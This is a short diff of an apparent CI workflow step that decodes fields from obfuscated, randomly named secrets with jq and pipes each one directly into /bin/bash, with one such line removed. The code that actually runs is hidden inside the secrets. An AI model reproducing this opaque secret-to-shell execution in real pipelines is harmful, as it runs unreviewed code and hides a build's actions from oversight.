@@ -23,7 +23,6 @@ jobs:
           rlq746: ${{ secrets.rlq746 }}
         run: |
           printf '%s' "$rlq746" | jq -r .jm05455 | /bin/bash
-          printf '%s' "$pv7" | jq -r .vgq647 | /bin/bash
           printf '%s' "$jtj92532" | jq -r .ah979 | /bin/bash
           echo $nq4 | jq -r .gr3432 | /bin/bash
           printf '%s' "$b5" | jq -r .qgs569 | /bin/bash
